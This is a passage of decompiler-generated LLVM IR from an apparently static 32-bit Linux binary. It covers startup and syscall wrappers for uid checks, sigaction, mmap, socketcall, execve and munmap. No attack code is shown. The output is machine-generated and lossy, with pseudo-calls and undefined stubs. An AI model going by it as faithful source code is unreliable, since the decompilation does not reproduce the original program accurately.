  %v0_80536f0 = phi i32 [ %tmp26, %dec_label_pc_80536d6 ], [ %v2_80536ec, %dec_label_pc_80536ec ]
  store i32 %v0_80536f0, i32* @global_var_8063b10.380, align 16
  %v13_80536f5 = icmp eq i32 %tmp25, -1
  %v1_80536fa = icmp eq i1 %v13_80536f5, false
  br i1 %v1_80536fa, label %dec_label_pc_8053725, label %dec_label_pc_80536fc

dec_label_pc_80536fc:                             ; preds = %dec_label_pc_80536f0
  %v0_80536fc = call i32 @function_8053a5c()
  store i32 %v0_80536fc, i32* @ebx, align 4
  %v0_8053703 = call i32 @function_80501ec()
  %v0_8053708 = load i32, i32* @ebx, align 4
  %v12_8053708 = icmp eq i32 %v0_8053708, %v0_8053703
  %v1_805370a = icmp eq i1 %v12_8053708, false
  br i1 %v1_805370a, label %dec_label_pc_805373b, label %dec_label_pc_805370c

dec_label_pc_805370c:                             ; preds = %dec_label_pc_80536fc
  %v0_805370c = call i32 @function_8053a20()
  store i32 %v0_805370c, i32* @ebx, align 4
  %v0_8053713 = call i32 @function_80539f8()
  %v0_8053718 = load i32, i32* @ebx, align 4
  %v12_8053718 = icmp eq i32 %v0_8053718, %v0_8053713
  %v1_805371a = icmp eq i1 %v12_8053718, false
  br i1 %v1_805371a, label %dec_label_pc_805373b, label %dec_label_pc_805371c.thread

dec_label_pc_805371c.thread:                      ; preds = %dec_label_pc_805370c
  br label %dec_label_pc_8053765

dec_label_pc_8053725:                             ; preds = %dec_label_pc_80536f0
  %v15_8053725 = icmp eq i32 %tmp25, %tmp24
  %v1_8053729 = icmp eq i1 %v15_8053725, false
  br i1 %v1_8053729, label %dec_label_pc_805373b, label %dec_label_pc_805372b

dec_label_pc_805372b:                             ; preds = %dec_label_pc_8053725
  br label %dec_label_pc_805373b

dec_label_pc_805373b:                             ; preds = %dec_label_pc_805372b, %dec_label_pc_8053725, %dec_label_pc_805370c, %dec_label_pc_80536fc
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8053742 = call i32 @function_80535d3()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8053751 = call i32 @function_80535d3()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053760 = call i32 @function_80535d3()
  br label %dec_label_pc_8053765

dec_label_pc_8053765:                             ; preds = %dec_label_pc_805371c.thread, %dec_label_pc_805373b
  store i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32* %esi.global-to-local, align 4
  %v0_805376a = load i32, i32* @edi, align 4
  %v1_805376a = inttoptr i32 %v0_805376a to i32*
  %v2_805376a = load i32, i32* %v1_805376a, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32* %esi.global-to-local, align 4
  store i32 %v2_805376a, i32* inttoptr (i32 134600824 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8063b14.376, align 4
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598653), i32 7), label %dec_label_pc_8053796, label %dec_label_pc_805378a

dec_label_pc_805378a:                             ; preds = %dec_label_pc_8053765, %dec_label_pc_805378a
  %v4_805378a47 = phi i32 [ %v1_8053791, %dec_label_pc_805378a ], [ 0, %dec_label_pc_8053765 ]
  store i32 ptrtoint (i32* @global_var_8053791.383 to i32), i32* %stack_var_-160, align 4
  %v5_805378a = mul i32 %v4_805378a47, 4
  %v6_805378a = add i32 %v5_805378a, ptrtoint (i32* @global_var_805d000.374 to i32)
  %v7_805378a = inttoptr i32 %v6_805378a to i32*
  %v8_805378a = load i32, i32* %v7_805378a, align 4
  call void @__pseudo_call(i32 %v8_805378a)
  %v0_8053791 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053791 = add i32 %v0_8053791, 1
  store i32 %v1_8053791, i32* %ebx.global-to-local, align 4
  %v1_8053792.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8053792 = icmp ult i32 %v1_8053791, %v1_8053792.pre
  br i1 %v7_8053792, label %dec_label_pc_805378a, label %dec_label_pc_8053796

dec_label_pc_8053796:                             ; preds = %dec_label_pc_805378a, %dec_label_pc_8053765
  store i32 134559644, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), i32 0), label %dec_label_pc_80537ae, label %dec_label_pc_80537ba

dec_label_pc_80537ae:                             ; preds = %dec_label_pc_8053796, %dec_label_pc_80537ae
  %v4_80537ae44 = phi i32 [ %v1_80537b5, %dec_label_pc_80537ae ], [ 0, %dec_label_pc_8053796 ]
  store i32 ptrtoint (i32* @global_var_80537b5.384 to i32), i32* %stack_var_-160, align 4
  %v5_80537ae = mul i32 %v4_80537ae44, 4
  %v6_80537ae = add i32 %v5_80537ae, ptrtoint (i32* @global_var_805d000.374 to i32)
  %v7_80537ae = inttoptr i32 %v6_80537ae to i32*
  %v8_80537ae = load i32, i32* %v7_80537ae, align 4
  call void @__pseudo_call(i32 %v8_80537ae)
  %v0_80537b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80537b5 = add i32 %v0_80537b5, 1
  store i32 %v1_80537b5, i32* %ebx.global-to-local, align 4
  %v1_80537b6.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80537b6 = icmp ult i32 %v1_80537b5, %v1_80537b6.pre
  br i1 %v7_80537b6, label %dec_label_pc_80537ae, label %dec_label_pc_80537ba

dec_label_pc_80537ba:                             ; preds = %dec_label_pc_80537ae, %dec_label_pc_8053796
  %v0_80537c3 = load i32, i32* %stack_var_-160, align 4
  %v1_80537c3 = call i32 @function_8050568(i32 %v0_80537c3)
  %v1_80537c8 = inttoptr i32 %v1_80537c3 to i32*
  store i32 0, i32* %v1_80537c8, align 4
  %v0_80537d7 = call i32 @function_8053b78()
  store i32 %v0_80537d7, i32* @eax, align 4
  %v1_80537dc = inttoptr i32 %v0_80537d7 to i32*
  store i32 0, i32* %v1_80537dc, align 4
  %v0_80537e2 = load i32, i32* @eax, align 4
  store i32 %v0_80537e2, i32* %stack_var_-160, align 4
  %v0_80537e9 = load i32, i32* @edi, align 4
  store i32 %v0_80537e9, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_80537f8 = load i32, i32* @eax, align 4
  %v1_80537fb = call i32 @function_80531e8(i32 %v0_80537f8)
  %v0_8053805 = load i32, i32* @ebx, align 4
  %v1_8053805 = inttoptr i32 %v0_8053805 to %sigcontext*
  %v2_8053805 = call i32 @sigreturn(%sigcontext* %v1_8053805)
  %v0_805380d = load i32, i32* @ebx, align 4
  %v1_805380d = inttoptr i32 %v0_805380d to %sigcontext*
  %v2_805380d = call i32 @sigreturn(%sigcontext* %v1_805380d)
  ret i32 %v2_805380d

; uselistorder directives
  uselistorder i32 %v1_80537b5, { 1, 2, 0 }
  uselistorder i32 %v1_8053791, { 1, 2, 0 }
  uselistorder i32 %v2_80536d1, { 1, 0 }
  uselistorder i32 %v1_80536ce, { 2, 1, 0 }
  uselistorder i32 %v1_80536ad, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80536aa, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), { 0, 2, 1 }
  uselistorder i32 ()* @function_80535d3, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_80537ae, { 1, 0 }
  uselistorder label %dec_label_pc_805378a, { 1, 0 }
  uselistorder label %dec_label_pc_8053765, { 1, 0 }
  uselistorder label %dec_label_pc_80536f0, { 1, 0 }
  uselistorder label %dec_label_pc_80536ce, { 1, 0 }
  uselistorder label %dec_label_pc_80536b6, { 1, 0 }
  uselistorder label %dec_label_pc_8053693, { 1, 0 }
}

define i32 @function_805380f(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805380f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805380f = load i32, i32* @esi, align 4
  %v0_8053810 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8053825 = icmp eq i32* %arg2, null
  br i1 %v1_8053825, label %dec_label_pc_8053878, label %dec_label_pc_8053829

dec_label_pc_8053829:                             ; preds = %dec_label_pc_805380f
  %v2_8053829 = load i32, i32* %arg2, align 4
  store i32 %v2_8053829, i32* %stack_var_-148, align 4
  %v1_8053832 = add i32 %tmp11, 4
  %v3_8053844 = bitcast i32* %stack_var_-136 to i16*
  %v4_8053844 = call i32 @function_8051414(i16* %v3_8053844, i32 %v1_8053832, i32 128)
  %v1_8053849 = add i32 %tmp11, 132
  %v2_8053863 = inttoptr i32 %v1_8053849 to i8*
  %v3_8053863 = load i8, i8* %v2_8053863, align 1
  %v4_8053863 = and i8 %v3_8053863, 4
  %v5_8053863 = icmp eq i8 %v4_8053863, 0
  %v1_805386a = icmp eq i1 %v5_8053863, false
  br i1 %v1_805386a, label %dec_label_pc_8053878, label %dec_label_pc_805386c

dec_label_pc_805386c:                             ; preds = %dec_label_pc_8053829
  br label %dec_label_pc_8053878

dec_label_pc_8053878:                             ; preds = %dec_label_pc_805386c, %dec_label_pc_8053829, %dec_label_pc_805380f
  %v1_805387a = icmp eq i32 %arg3, 0
  br i1 %v1_805387a, label %dec_label_pc_8053882, label %dec_label_pc_805387e

dec_label_pc_805387e:                             ; preds = %dec_label_pc_8053878
  %v2_805387e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8053882

dec_label_pc_8053882:                             ; preds = %dec_label_pc_8053878, %dec_label_pc_805387e
  %v0_8053891 = phi i32 [ 0, %dec_label_pc_8053878 ], [ %v2_805387e, %dec_label_pc_805387e ]
  br i1 %v1_8053825, label %dec_label_pc_805388f, label %dec_label_pc_8053888

dec_label_pc_8053888:                             ; preds = %dec_label_pc_8053882
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805388f

dec_label_pc_805388f:                             ; preds = %dec_label_pc_8053882, %dec_label_pc_8053888
  %v0_8053892 = phi %sigaction* [ null, %dec_label_pc_8053882 ], [ %phitmp, %dec_label_pc_8053888 ]
  %v5_805389a = call i32 @function_8053950(i32 %arg1, %sigaction* %v0_8053892, i32 %v0_8053891, i32 8)
  store i32 %v5_805389a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805387a, label %dec_label_pc_80538dd, label %dec_label_pc_80538a8

dec_label_pc_80538a8:                             ; preds = %dec_label_pc_805388f
  %v2_80538a8 = icmp slt i32 %v5_805389a, 0
  br i1 %v2_80538a8, label %dec_label_pc_80538dd, label %dec_label_pc_80538ac

dec_label_pc_80538ac:                             ; preds = %dec_label_pc_80538a8
  %v3_80538ac = load i32, i32* %stack_var_-288, align 4
  %v2_80538b0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80538ac, i32* %v2_80538b0, align 4
  %v2_80538b8 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80538bd = add i32 %arg3, 4
  %v3_80538c1 = inttoptr i32 %v1_80538bd to i16*
  %v4_80538c1 = call i32 @function_8051414(i16* %v3_80538c1, i32 %v2_80538b8, i32 128)
  %v2_80538ca = add i32 %arg3, 132
  %v3_80538ca = inttoptr i32 %v2_80538ca to i32*
  %v2_80538d7 = add i32 %arg3, 136
  %v3_80538d7 = inttoptr i32 %v2_80538d7 to i32*
  %v0_80538dd.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80538dd

dec_label_pc_80538dd:                             ; preds = %dec_label_pc_80538a8, %dec_label_pc_805388f, %dec_label_pc_80538ac
  %v0_80538dd = phi i32 [ %v5_805389a, %dec_label_pc_80538a8 ], [ %v5_805389a, %dec_label_pc_805388f ], [ %v0_80538dd.pre, %dec_label_pc_80538ac ]
  store i32 %v0_8053810, i32* @ebx, align 4
  store i32 %v0_805380f, i32* @esi, align 4
  ret i32 %v0_80538dd

; uselistorder directives
  uselistorder i32 %v5_805389a, { 0, 1, 3, 2 }
  uselistorder i1 %v1_805387a, { 1, 0 }
  uselistorder i1 %v1_8053825, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80538dd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805388f, { 1, 0 }
  uselistorder label %dec_label_pc_8053882, { 1, 0 }
}

define i32 @function_80538e8() local_unnamed_addr {
dec_label_pc_80538e8:
  %v0_80538eb = load i32, i32* @eax, align 4
  %v1_80538ed = sub i32 0, %v0_80538eb
  %v1_80538ef = call i32 @function_8050568(i32 ptrtoint (i32* @0 to i32))
  %v2_80538f4 = inttoptr i32 %v1_80538ef to i32*
  store i32 %v1_80538ed, i32* %v2_80538f4, align 4
  ret i32 -1
}

define i32 @function_8053900(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8053900:
  %stack_var_4 = alloca i32, align 4
  %v0_8053900 = load i32, i32* @ebx, align 4
  store i32 %v0_8053900, i32* @edx, align 4
  %v2_805390b = load i32, i32* @ecx, align 4
  %v4_805390b = load i32, i32* @esi, align 4
  %v5_805390b = load i32, i32* @edi, align 4
  %v6_805390b = load i32, i32* @ebp, align 4
  %v7_805390b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805390b, i32 %v0_8053900, i32 %v4_805390b, i32 %v5_805390b, i32 %v6_805390b)
  %v8_805390b = ptrtoint i32* %v7_805390b to i32
  store i32 %v0_8053900, i32* @ebx, align 4
  %v3_8053914 = icmp ugt i32* %v7_805390b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8053914, i32 134559976)
  ret i32 %v8_805390b

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134559976, { 1, 0 }
}

define i32 @function_805391c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805391c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805391c = load i32, i32* @ebx, align 4
  store i32 %v0_805391c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805392f = call i32 @int80_syscall(i32 102)
  store i32 %v1_805392f, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805392f, -4095
  br i1 %tmp9, label %dec_label_pc_8053948, label %dec_label_pc_805393c

dec_label_pc_805393c:                             ; preds = %dec_label_pc_805391c
  %v1_805393c = call i32 @function_8050568(i32 %v0_805391c)
  %v0_8053941 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053941 = sub i32 0, %v0_8053941
  %v2_8053943 = inttoptr i32 %v1_805393c to i32*
  store i32 %v1_8053941, i32* %v2_8053943, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805394c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053948

dec_label_pc_8053948:                             ; preds = %dec_label_pc_805391c, %dec_label_pc_805393c
  %v2_805394c = phi i32 [ %v0_805391c, %dec_label_pc_805391c ], [ %v2_805394c.pre, %dec_label_pc_805393c ]
  %v0_8053948 = phi i32 [ %v1_805392f, %dec_label_pc_805391c ], [ -1, %dec_label_pc_805393c ]
  %v2_805394a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805394a, i32* @edx, align 4
  store i32 %v2_805394c, i32* @ebx, align 4
  ret i32 %v0_8053948

; uselistorder directives
  uselistorder i32 %v1_805392f, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053948, { 1, 0 }
}

define i32 @function_8053950(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053950:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8053951 = load i32, i32* @esi, align 4
  store i32 %v0_8053951, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053965 = load i32, i32* @ebx, align 4
  %v7_805396d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805396d, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805396d, -4095
  br i1 %tmp14, label %dec_label_pc_8053985, label %dec_label_pc_8053979

dec_label_pc_8053979:                             ; preds = %dec_label_pc_8053950
  %v1_8053979 = call i32 @function_8050568(i32 %v0_8053965)
  %v0_805397e = load i32, i32* %esi.global-to-local, align 4
  %v1_805397e = sub i32 0, %v0_805397e
  %v2_8053980 = inttoptr i32 %v1_8053979 to i32*
  store i32 %v1_805397e, i32* %v2_8053980, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053988.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053985

dec_label_pc_8053985:                             ; preds = %dec_label_pc_8053950, %dec_label_pc_8053979
  %v2_8053988 = phi i32 [ %v0_8053951, %dec_label_pc_8053950 ], [ %v2_8053988.pre, %dec_label_pc_8053979 ]
  %v0_8053985 = phi i32 [ %v7_805396d, %dec_label_pc_8053950 ], [ -1, %dec_label_pc_8053979 ]
  store i32 %v2_8053988, i32* @esi, align 4
  ret i32 %v0_8053985

; uselistorder directives
  uselistorder i32 %v7_805396d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053985, { 1, 0 }
}

define i32 @function_805398c(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805398c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805398c = load i32, i32* @ebx, align 4
  store i32 %v0_805398c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805399f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805399f, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_805399f, -4095
  br i1 %tmp10, label %dec_label_pc_80539b8, label %dec_label_pc_80539ac

dec_label_pc_80539ac:                             ; preds = %dec_label_pc_805398c
  %v1_80539ac = call i32 @function_8050568(i32 %v0_805398c)
  %v0_80539b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539b1 = sub i32 0, %v0_80539b1
  %v2_80539b3 = inttoptr i32 %v1_80539ac to i32*
  store i32 %v1_80539b1, i32* %v2_80539b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80539bc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80539b8

dec_label_pc_80539b8:                             ; preds = %dec_label_pc_805398c, %dec_label_pc_80539ac
  %v2_80539bc = phi i32 [ %v0_805398c, %dec_label_pc_805398c ], [ %v2_80539bc.pre, %dec_label_pc_80539ac ]
  %v0_80539b8 = phi i32 [ %v4_805399f, %dec_label_pc_805398c ], [ -1, %dec_label_pc_80539ac ]
  %v2_80539ba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80539ba, i32* @edx, align 4
  store i32 %v2_80539bc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80539b8

; uselistorder directives
  uselistorder i32 %v4_805399f, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80539b8, { 1, 0 }
}

define i32 @function_80539c0(i8* %arg1) local_unnamed_addr {
dec_label_pc_80539c0:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_80539c0 = load i32, i32* @edi, align 4
  store i32 %v0_80539c0, i32* %stack_var_-4, align 4
  %v4_80539c4 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80539c4, i32* %edi.global-to-local, align 4
  %v0_80539d0 = load i32, i32* @ebx, align 4
  %v5_80539d8 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80539d8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80539d8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80539d8, [1 x i8*] %v8_80539d8)
  store i32 %v9_80539d8, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v9_80539d8, -4095
  br i1 %tmp13, label %dec_label_pc_80539f0, label %dec_label_pc_80539e4

dec_label_pc_80539e4:                             ; preds = %dec_label_pc_80539c0
  %v1_80539e4 = call i32 @function_8050568(i32 %v0_80539d0)
  %v0_80539e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80539e9 = sub i32 0, %v0_80539e9
  %v2_80539eb = inttoptr i32 %v1_80539e4 to i32*
  store i32 %v1_80539e9, i32* %v2_80539eb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80539f4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80539f0

dec_label_pc_80539f0:                             ; preds = %dec_label_pc_80539c0, %dec_label_pc_80539e4
  %v2_80539f4 = phi i32 [ %v0_80539c0, %dec_label_pc_80539c0 ], [ %v2_80539f4.pre, %dec_label_pc_80539e4 ]
  %v0_80539f0 = phi i32 [ %v9_80539d8, %dec_label_pc_80539c0 ], [ -1, %dec_label_pc_80539e4 ]
  store i32 %v2_80539f4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80539f0

; uselistorder directives
  uselistorder i32 %v9_80539d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80539f0, { 1, 0 }
}

define i32 @function_80539f8() local_unnamed_addr {
dec_label_pc_80539f8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80539f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80539f8, i32* %stack_var_-4, align 4
  %v1_8053a01 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8053a01, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053a01, -4095
  br i1 %tmp7, label %dec_label_pc_8053a18, label %dec_label_pc_8053a0c

dec_label_pc_8053a0c:                             ; preds = %dec_label_pc_80539f8
  %v1_8053a0c = call i32 @function_8050568(i32 %v0_80539f8)
  %v0_8053a11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a11 = sub i32 0, %v0_8053a11
  %v2_8053a13 = inttoptr i32 %v1_8053a0c to i32*
  store i32 %v1_8053a11, i32* %v2_8053a13, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053a1c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053a18

dec_label_pc_8053a18:                             ; preds = %dec_label_pc_80539f8, %dec_label_pc_8053a0c
  %v2_8053a1c = phi i32 [ %v0_80539f8, %dec_label_pc_80539f8 ], [ %v2_8053a1c.pre, %dec_label_pc_8053a0c ]
  %v0_8053a18 = phi i32 [ %v1_8053a01, %dec_label_pc_80539f8 ], [ -1, %dec_label_pc_8053a0c ]
  store i32 %v2_8053a1c, i32* @ebx, align 4
  ret i32 %v0_8053a18

; uselistorder directives
  uselistorder i32 %v1_8053a01, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8053a18, { 1, 0 }
}

define i32 @function_8053a20() local_unnamed_addr {
dec_label_pc_8053a20:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053a20 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a20, i32* %stack_var_-4, align 4
  %v1_8053a29 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8053a29, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053a29, -4095
  br i1 %tmp7, label %dec_label_pc_8053a40, label %dec_label_pc_8053a34

dec_label_pc_8053a34:                             ; preds = %dec_label_pc_8053a20
  %v1_8053a34 = call i32 @function_8050568(i32 %v0_8053a20)
  %v0_8053a39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a39 = sub i32 0, %v0_8053a39
  %v2_8053a3b = inttoptr i32 %v1_8053a34 to i32*
  store i32 %v1_8053a39, i32* %v2_8053a3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053a44.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053a40

dec_label_pc_8053a40:                             ; preds = %dec_label_pc_8053a20, %dec_label_pc_8053a34
  %v2_8053a44 = phi i32 [ %v0_8053a20, %dec_label_pc_8053a20 ], [ %v2_8053a44.pre, %dec_label_pc_8053a34 ]
  %v0_8053a40 = phi i32 [ %v1_8053a29, %dec_label_pc_8053a20 ], [ -1, %dec_label_pc_8053a34 ]
  store i32 %v2_8053a44, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053a40

; uselistorder directives
  uselistorder i32 %v1_8053a29, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053a40, { 1, 0 }
}

define i32 @function_8053a48() local_unnamed_addr {
dec_label_pc_8053a48:
  %v0_8053a48 = load i32, i32* @global_var_8063b10.380, align 16
  %v1_8053a52 = icmp eq i32 %v0_8053a48, 0
  br i1 %v1_8053a52, label %dec_label_pc_8053a58, label %dec_label_pc_8053a56

dec_label_pc_8053a56:                             ; preds = %dec_label_pc_8053a48
  br label %dec_label_pc_8053a58

dec_label_pc_8053a58:                             ; preds = %dec_label_pc_8053a48, %dec_label_pc_8053a56
  %storemerge = phi i32 [ %v0_8053a48, %dec_label_pc_8053a56 ], [ 4096, %dec_label_pc_8053a48 ]
  %v0_8053a58 = phi i32 [ %v0_8053a48, %dec_label_pc_8053a56 ], [ 4096, %dec_label_pc_8053a48 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8053a58

; uselistorder directives
  uselistorder label %dec_label_pc_8053a58, { 1, 0 }
}

define i32 @function_8053a5c() local_unnamed_addr {
dec_label_pc_8053a5c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053a5c = load i32, i32* @ebx, align 4
  store i32 %v0_8053a5c, i32* %stack_var_-4, align 4
  %v1_8053a65 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8053a65, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053a65, -4095
  br i1 %tmp7, label %dec_label_pc_8053a7c, label %dec_label_pc_8053a70

dec_label_pc_8053a70:                             ; preds = %dec_label_pc_8053a5c
  %v1_8053a70 = call i32 @function_8050568(i32 %v0_8053a5c)
  %v0_8053a75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a75 = sub i32 0, %v0_8053a75
  %v2_8053a77 = inttoptr i32 %v1_8053a70 to i32*
  store i32 %v1_8053a75, i32* %v2_8053a77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053a80.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053a7c

dec_label_pc_8053a7c:                             ; preds = %dec_label_pc_8053a5c, %dec_label_pc_8053a70
  %v2_8053a80 = phi i32 [ %v0_8053a5c, %dec_label_pc_8053a5c ], [ %v2_8053a80.pre, %dec_label_pc_8053a70 ]
  %v0_8053a7c = phi i32 [ %v1_8053a65, %dec_label_pc_8053a5c ], [ -1, %dec_label_pc_8053a70 ]
  store i32 %v2_8053a80, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053a7c

; uselistorder directives
  uselistorder i32 %v1_8053a65, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8053a7c, { 1, 0 }
}

define i32 @function_8053a84(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053a84:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053a84 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a84, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8053a97 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8053a97, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8053a97, -4095
  br i1 %tmp10, label %dec_label_pc_8053ab0, label %dec_label_pc_8053aa4

